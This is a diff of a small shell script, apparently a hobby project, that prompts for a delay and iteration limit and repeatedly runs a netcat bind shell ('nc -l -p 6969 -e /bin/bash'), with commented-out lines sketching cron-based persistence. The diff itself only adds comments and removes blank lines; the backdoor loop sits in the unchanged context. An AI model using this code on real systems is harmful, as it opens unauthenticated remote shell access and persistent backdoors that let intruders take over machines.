@@ -4,21 +4,17 @@
 # what I am going to do with this. The first script will add something to
 # the cron file every 5 seconds, to proof as a form of persistance
 
-
 echo "How many seconds should I wait to re-open the beacon?(120s default)"
-
 read delay
-
 echo "should I stop after a certian amount of iterations? (No limit default)"
-
 read limit
 
-
+#if there is no specified delay set to 1 second
 if [ -z "$delay" ] ; then
  let delay=1
 fi
 
-
+#No Limit given
 if [ -z "$limit" ] ; then
  # persistance?
  # $(crontab -l > /bin/newcron)
@@ -28,6 +24,8 @@ if [ -z "$limit" ] ; then
    $(nc -l -p 6969 -e /bin/bash)
    sleep $delay
  done
+
+#Limit given
 else
  # persistance?
  # $(crontab */1 * * * * /bin/zsh4)
